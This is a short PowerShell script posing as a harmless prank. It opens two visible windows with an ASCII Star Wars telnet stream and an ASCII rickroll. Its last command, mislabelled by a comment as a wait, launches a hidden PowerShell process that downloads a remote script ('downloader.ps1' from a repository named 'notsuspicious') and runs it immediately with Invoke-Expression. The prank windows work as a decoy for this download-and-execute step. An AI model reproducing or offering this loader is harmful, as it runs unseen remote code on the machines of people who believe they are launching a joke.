
# Start Star Wars in a new Command Prompt window to the left
Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
# Start rickroll in ASCII in a new Command Prompt window to the right
Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal

# Wait for a moment to let the windows start
Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-NoLogo", "-NoProfile", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content"

